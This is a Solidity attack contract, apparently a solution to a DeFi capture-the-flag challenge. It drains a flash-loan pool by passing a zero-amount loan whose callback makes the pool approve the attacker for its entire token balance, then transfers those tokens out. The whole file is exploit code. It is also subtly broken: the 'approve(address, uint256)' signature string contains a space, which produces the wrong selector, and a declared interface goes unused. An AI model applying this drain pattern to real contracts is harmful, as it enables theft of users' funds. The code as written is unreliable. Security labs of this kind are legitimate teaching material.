// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

interface IPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)  external returns (bool);
}

contract TrusterAttacker {

    function attack(IERC20 token, TrusterLenderPool pool) public  {
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory payload = abi.encodeWithSignature("approve(address, uint256)", address(this), poolBalance);
        pool.flashLoan(0, msg.sender, address(token), payload);
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}
